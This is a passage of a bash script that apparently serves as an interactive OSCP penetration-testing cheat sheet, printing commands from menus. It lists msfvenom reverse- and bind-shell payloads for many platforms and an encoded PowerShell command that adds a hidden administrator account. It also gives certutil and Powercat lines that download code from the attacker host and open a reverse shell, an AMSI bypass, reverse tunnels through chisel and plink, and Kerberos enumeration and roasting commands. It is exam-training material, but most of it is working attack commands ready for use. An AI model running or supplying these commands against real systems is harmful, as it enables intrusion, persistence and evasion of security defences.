echo "   msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f elf > $HOME/OSCPShare/bind.elf"
echo "linux/x86/meterpreter/bind_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
LinuxBindShell(){
echo "   Linux Bind Shell (ELF)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f elf > $HOME/OSCPShare/term.elf"
echo "generic/shell_bind_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
WindowsMeterpreterReverseTCPShell(){
echo "   Windows Meterpreter Reverse TCP Shell (EXE)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f exe > $HOME/OSCPShare/shell.exe"
echo "windows/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
WindowsReverseTCPShell(){
echo "   Windows Reverse TCP Shell (EXE)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p windows/shell/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f exe > $HOME/OSCPShare/shell.exe"
echo "windows/shell/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
WindowsEncodedMeterpreterWindowsReverseShell(){
echo "   Windows Encoded Meterpreter Windows Reverse Shell (EXE)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > $HOME/OSCPShare/encoded.exe"
echo "windows/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
MacReverseShell(){
echo "   Mac Reverse Shell (MACHO)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f macho > $HOME/OSCPShare/shell.macho"
echo "osx/x86/shell_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
MacBindShell(){
echo "   Mac Bind Shell (MACHO)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f macho > $HOME/OSCPShare/bind.macho"
echo "osx/x86/shell_bind_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
PHPMeterpreterReverseTCP(){
echo "   PHP Meterpreter Reverse TCP (PHP)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p php/meterpreter_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.php"
echo "php/meterpreter_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
ASPMeterpreterReverseTCP(){
echo "   ASP Meterpreter Reverse TCP (ASP)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f asp > $HOME/OSCPShare/shell.asp"
echo "windows/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
JSPJavaMeterpreterReverseTCP(){
echo "   JSP Java Meterpreter Reverse TCP (JSP)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.jsp"
echo "java/jsp_shell_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
WAR(){
echo "   WAR"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f war > $HOME/OSCPShare/shell.war"
echo "java/jsp_shell_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
PythonReverseShell(){
echo "   Python Reverse Shell (PY)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p cmd/unix/reverse_python LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.py"
echo "cmd/unix/reverse_python" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
BashUnixReverseShell(){
echo "   Bash Unix Reverse Shell (SH)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p cmd/unix/reverse_bash LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.sh"
echo "cmd/unix/reverse_bash" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
PerlUnixReverseshell(){
echo "   Perl Unix Reverse shell (PL)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p cmd/unix/reverse_perl LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.pl"
echo "cmd/unix/reverse_perl" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
WindowsMeterpreterReverseTCPShellcode(){
echo "   Windows Meterpreter Reverse TCP Shellcode (MANUAL)"
echo 
echo "Adjust this command:"
echo 
echo "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f <language>"
echo "windows/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
LinuxMeterpreterReverseTCPShellcode(){
echo "   Linux Meterpreter Reverse TCP Shellcode (MANUAL)"
echo 
echo "Adjust this command:"
echo 
echo "   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f <language>"
echo "linux/x86/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
MacReverseTCPShellcode(){
echo "   Mac Reverse TCP Shellcode (MANUAL)"
echo 
echo "Adjust this command:"
echo 
echo "   msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f <language>"
Metasploit
}
CreateUser(){
echo "   Create User and/or Add Administrator Privileges"
echo 
echo "Run These commands"
echo
echo " On Windows"
echo "   \$Text = 'net user evil h4cker123! /add; net localgroup administrators evil /add; net localgroup "Remote Desktop Users" evil /add; net localgroup "Remote Management Users" evil /add'"
echo "   \$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)"
echo "   \$EncodedText =[Convert]::ToBase64String($Bytes)"
echo "   \$EncodedText"
echo
echo " On Kali"
echo "   \$ msfvenom -p windows/exec CMD='powershell -e bgBlAHQAIAB1AHMAZQByACAAZQB2AGkAbAAgAGgANABjAGsAZQByADEAMgAzACEAIAAvAGEAZABkADsAIABuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIABlAHYAaQBsACAALwBhAGQAZAA7ACAAbgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAIgBSAGUAbQBvAHQAZQAgAEQAZQBzAGsAdABvAHAAIABVAHMAZQByAHMAIgAgAGUAdgBpAGwAIAAvAGEAZABkADsAIABuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIAAiAFIAZQBtAG8AdABlACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFUAcwBlAHIAcwAiACAAZQB2AGkAbAAgAC8AYQBkAGQA' -f dll -o psuser.dll"
echo 
echo " On Windows"
echo "   C:\Users\Ninja\Desktop>rundll32.exe psuser.dll,1"
echo
echo "Or Run this command:"
echo 
echo "   msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > $HOME/OSCPShare/adduser.exe"
}

WindowsMeterpreterPS4Mimikatz(){
echo "   Windows Meterpreter Reverse Powershell Shellcode for use with Mimikatz (PS1)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f psh -o $HOME/OSCPShare/install.ps1"
echo "windows/x64/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}

MSFQuestion(){
	echo "         1)   Linux Meterpreter Reverse Shell (elf)"
	echo "         2)   Linux Bind Meterpreter Shell (elf)"
	echo "         3)   Linux Bind Shell (elf)"
	echo "         4)   Windows Meterpreter Reverse TCP Shell (exe)"
	echo "         5)   Windows Reverse TCP Shell (exe)"
	echo "         6)   Windows Encoded Meterpreter Windows Reverse Shell (exe)"
	echo "         7)   Mac Reverse Shell (macho)"
	echo "         8)   Mac Bind Shell (macho)"
	echo "         9)   PHP Meterpreter Reverse TCP (php)"
	echo "         10)  ASP Meterpreter Reverse TCP (asp)"
	echo "         11)  JSP Java Meterpreter Reverse TCP (jsp)"
	echo "         12)  Tomcat WAR (war)"
	echo "         13)  Python Reverse Shell (py)"
	echo "         14)  Bash Unix Reverse Shell (sh)"
	echo "         15)  Perl Unix Reverse shell (pl)"
	echo "         16)  Windows Meterpreter Reverse TCP Shellcode (manual)"
	echo "         17)  Linux Meterpreter Reverse TCP Shellcode (manual)"
	echo "         18)  Mac Reverse TCP Shellcode (manual)"
	echo "         19)  Create User (list commands)"
	echo "         20)  Windows Meterpreter Powershell for use with mimikatz (ps1)"
	
	read -p "  [+] Choices: (1-20) : " choicemsf

case "$choicemsf" in
  1 ) LinuxMeterpreterReverseShell ;;
  2 ) LinuxBindMeterpreterShell ;;
  3 ) LinuxBindShell ;;
  4 ) WindowsMeterpreterReverseTCPShell ;;
  5 ) WindowsReverseTCPShell ;;
  6 ) WindowsEncodedMeterpreterWindowsReverseShell ;;
  7 ) MacReverseShell ;;
  8 ) MacBindShell ;;
  9 ) PHPMeterpreterReverseTCP ;;
  10 ) ASPMeterpreterReverseTCP ;;
  11 ) JSPJavaMeterpreterReverseTCP ;;
  12 ) WAR ;;
  13 ) PythonReverseShell ;;
  14 ) BashUnixReverseShell ;;
  15 ) PerlUnixReverseshell ;;
  16 ) WindowsMeterpreterReverseTCPShellcode ;;
  17 ) LinuxMeterpreterReverseTCPShellcode ;;
  18 ) MacReverseTCPShellcode ;;
  19 ) CreateUser ;;
  20 ) WindowsMeterpreterPS4Mimikatz ;;
  * ) echo "Invalid" ;;
esac
}

MenuMSFconsole(){
ReconstructVars
echo "   [+] The Adapter IP is set to $LocalIP"
echo -n "   [+] What PORT to listen on for your reverse shell?:"$'\n'

read PORT

echo $PORT > $scriptlocation/vars/reverseport.txt
ReconstructVars

echo "   msfvenom -l"
echo "   msfvenom --list payloads"

MSFQuestion
}

MenuPortTunneling() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] ssh: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   nano /etc/proxychain.conf"
echo "   socks4	localhost 8888"
echo
echo "   ssh -L 8888:localhost:8888 $ActiveUser@$ActiveHost \\"
echo "   -t ssh -L 8888:localhost:8888 nextuser@x.x.x.x"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] sshuttle: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   sudo apt install sshuttle"
echo "   sshuttle -r $ActiveUser@$ActiveHost 0.0.0.0/0 -vv"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] plink: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "On Kali:"
echo "   nano /etc/ssh/sshd_config"
echo "   PermitRootLogin yes"
echo "   PasswordAuthentication yes"
echo "   sudo su"
echo "   passwd root"
echo
echo "   sudo systemctrl stop ssh"
echo "   sudo systemctrl start ssh"
echo
echo "On Windows"
echo "   check for ports listening for example on 0.0.0.0:445 via: netstat -ano"
echo "   certutil.exe -urlcache -f http://$LocalIP/plink32.exe plink32.exe"
echo "   certutil.exe -urlcache -f http://$LocalIP/plink64.exe plink64.exe"
echo
echo "   cmd.exe /c echo y | plink32.exe -ssh -l root -pw toor -R 445:127.0.0.1:445 $LocalIP"
echo "   cmd.exe /c echo y | plink64.exe -ssh -l root -pw toor -R 445:127.0.0.1:445 $LocalIP"
echo
echo "   python3 /opt/impacket/examples/smbexec.py Administrator:'PASS'@127.0.0.1"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Chisel: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   KALI:"
echo "   ./chisel server --reverse --port 9999"
echo "   WIN10:"
echo "   chisel client $LocalIP:9999 R:5985:127.0.0.1:7777"
echo "   WIN10:"
echo "   chisel.exe server --reverse --port 8989"
echo "   Member Server:"
echo "   LOCAL (MS):  .\chisel.exe client $ActiveHost:8989 R:7777:127.0.0.1:5985"
echo "   TO DC:  .\chisel.exe client $ActiveHost:8989 R:7777:$ADIP:5985"
echo
echo "   Socks: https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html"
echo
echo "   Kali:"
echo "   ./chisel server -p 8000 --reverse"
echo
echo "   Windows:"
echo "   chisel client $LocalIP:8000 R:socks" 
echo
echo "   Proxychains"
echo "   socks5	127.0.0.1 1080"
echo
echo "   Examples from: https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html"
echo "   chisel client 10.10.14.3:8000 R:80:127.0.0.1:80	Listen on Kali 80, forward to localhost port 80 on client"
echo "   chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80	Listen on Kali 4444, forward to 10.10.10.240 port 80"
echo "   chisel client 10.10.14.3:8000 R:socks		Create SOCKS5 listener on 1080 on Kali, proxy through client"
echo
echo "   Chisel Tunnel for Kerberoasting" 
echo
echo "   Windows"
echo "   chisel client 10.10.14.6:8008 R:88:127.0.0.1:88 R:389:localhost:389"
echo
echo "   Linux"
echo "   ./chisel server -p 8008 --reverse" 
echo
ShowMeMore
}

MenuHelp() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    When all help is lost: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo 
echo "   wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64"
echo "   chmod +x kerbrute_linux_amd64"
echo "   wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt"
echo "   wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt"
echo "   ./kerbrute_linux_amd64 userenum --dc=$ADIP -d=$ADdomain. userlist.txt"
echo
echo "   Construct your valid users"
echo "   python3 /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile $scriptlocation/vars/ActiveUsernames.txt -dc-ip 10.10.6.165 $ADIP/"
echo
echo "   Take a break, sit down and relax and let your thoughts \do the working"
echo "   Review what you did and did not. Write it down and take baby steps"
echo "   Decide if you are in a 'Rabbit Hole'. Get out and select a new target"
echo "   Note your steps to take in logical order and start"
echo "   Do not deviate from your plan, note findings and make a new plan"
echo "   Did you had your 20 minute break? You may continue"
echo "   Set a timer on your targets: https://pomofocus.io/"
echo 
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Altnernative exploit repository: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   https://sploitus.com/"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    References - CheatSheets OSCP: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   Active Directory:"
echo "   https://hideandsec.sh/books/cheatsheets-82c"
echo "   Windows:"
echo "   https://cheatsheet.haax.fr/windows-systems/"
echo "   Linux:"
echo "   https://cheatsheet.haax.fr/linux-systems/"
echo "   https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all"
echo "   Hacktricks":
echo "   https://book.hacktricks.xyz/welcome/readme"
echo "   MSFVenom:"
echo "   https://www.learn-codes.net/php/msfvenom-cheat-sheet-aspx/"
echo
echo "   Responder: To Use or NOT to Use on the OSCP Exam:"
echo "   https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/"
echo "   https://www.youtube.com/shorts/kGkP-QUDpmc"
echo
echo "   Reverse Shells"
echo "   https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" 
echo "   https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" 
echo
echo "   Privilege Escalation" 
echo "   https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" 
echo
echo "   MySQL 4.x/5.0 \(Linux\) - User-Defined Function \(UDF\) Dynamic Library \(2\)" 
echo "   https://www.exploit-db.com/exploits/1518"
echo
echo "   Get-The-Fuck-Out-Of-Restricted-Shell-Bins \(GTFOBins\)" 
echo "   https://gtfobins.github.io/"
echo
echo "   Windows or Active Directory Commands" 
echo "   https://wadcoms.github.io/" 
echo
echo "   Living Off The Land Binaries, scripts and libraries"
echo "   https://lolbas-project.github.io/"
echo
echo "   Powercat"
echo "   IEX (New-Object System.Net.Webclient).DownloadString('https://$LocalIP/powercat.ps1');powercat -c $LocalIP -p 443" 
echo "   rlwrap nc -nlvp 443"
echo
echo "   Evil-WinRM using NTLM hash"
echo "   evil-winrm -i $ActiveHost -u <USER> -H $NTHash"
echo
echo "   Bypass 4MSI check"
echo "   In powershell execute: 'AmsiUtils' if error AMSI is working"
echo "   In powershell execute: 'Amsi+Utils' if no error bypass with below code"
echo
echo "   Bypass 4MSI"
echo "   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
echo
echo "   Bypass 4MSI hex encode"
echo "   https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/"
echo "   Copy code block after: 'Decoding at runtime and therefore one more valid bypass looks like this'"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Search for exploits: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   Google/BING: Exploit <software + version>" 
echo "   Google/BING: Exploit <software + version> site:github.com" 
echo "   Google/BING: Exploit <software + version> site:exploit-db.com"
echo
echo "   Google/BING: lpe <service>"
echo "   Google/BING: privesc <service>"
echo "   Google/BING: privilege escalation <service>"
echo "   Google/BING: privilege escalation <service> site:github.com"
echo "   Google/BING: privilege escalation <service> site:exploit-db.com"
echo 
echo "   Google/BING: kernel exploit <kernel version>"
echo "   Google/BING: RCE <software + version>"
echo "   Google/BING: CVE <software + version>"
echo
echo "   searchsploit <software>"
echo "   searchsploit <software + version> [Filter as needed]"
echo
echo "   https://github.com/SecWiki/windows-kernel-exploits" 
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

ShowMeMore() {
	echo -e "\e[0m ${bold}"
	echo "     [+] Choose your method:"
	echo
	echo "         1)  Pentesting AD              "	"       11)  Domain Account Acquired"
	echo "         2)  Find Vulnerable            "	"       12)  Relay"
	echo "         3)  User Credentials           "	"       13)  Repositories"
	echo "         4)  Privilege Escalation       "	"       14)  File Transfers"
	echo "         5)  Responder + Hashes         "	"       15)  Web Server"
	echo "         6)  Lateral Movement           " "       16)  msfconsole"
	echo "         7)  Trust Relationship         " "       17)  Port Tunneling"
	echo "         8)  Persistence                " "       18)  HELP! Nothing is working!"
	echo "         9)  Domain Admin (ntdsdit)     " "       19)  Main Menu"
	echo "        10)  Administrator Access       " "       20)  Quit"
	echo
	read -p "  [+] Choices: (1-20) : " choice

case "$choice" in
  1 ) MenuPentestingAD ;;
  2 ) MenuFind ;;
  3 ) MenuUser ;;
  4 ) MenuPrivilege ;;
  5 ) MenuResponder ;;
  6 ) MenuLateral ;;
  7 ) MenuTrust ;;
  8 ) MenuPersistence ;;
  9 ) MenuDomain-Admin ;;
  10 ) MenuAdministrator ;;
  11 ) MenuDomain-Account ;;
  12 ) MenuRelay ;;
  13 ) MenuRepositories ;;
  14 ) MenuFileTransfers ;;
  15 ) MenuWebServer ;;
  16 ) MenuMSFconsole ;;
  17 ) MenuPortTunneling ;;
  18 ) MenuHelp ;;
  19 ) Choices ;;
  20 ) exit ;;
  * ) echo "   Invalid" ;;
esac
}

Choices() {
	echo
	echo -e "\e[96m ${bold}    [i] Choose your setup\e[30m ${normal}"
	echo
	echo -e "\e[31m ${bold} [!] Step 1: First 3, Step 2: 4,5"
	echo
	echo -e "\e[32m"
        echo "        [1] Set Local Adapter        # Web Server Functionality     "
	echo "        [2] Active Host              # Active Host for commands     "
	echo "        [3] Multiple Hosts           # Complete scope for scans     "
	echo "        [4] Set AD Server            # Just Run me, I'll do it!     "
	echo "        [5] Set Credentials          # Credentialed commands list   "
	echo "        [6] Let me set all manually  # Let me input mannually please"
	echo "        [7] Set ProxyChains          # Built most commands with proxychains"
	echo "        [8] Continue to commands     # Commands automatically composed "
	echo "        [9] Quit                     # Sure?                        "
	echo -e "\e[30m"
	echo
read -p "  [?] Choices: (1/2/3/4/5/6/7/8/9) : " choice
case "$choice" in
  1 ) AdapterChoice ;;
  2 ) Active ;;
  3 ) Multiple ;;	
  4 ) SetAD ;;
  5 ) SetCreds ;;
  6 ) ManualSet ;;
  7 ) SetProxyChains ;;
  8 ) ShowMeMore ;;
  9 ) exit ;;
  * ) echo "   Invalid";;
esac
}

Choices
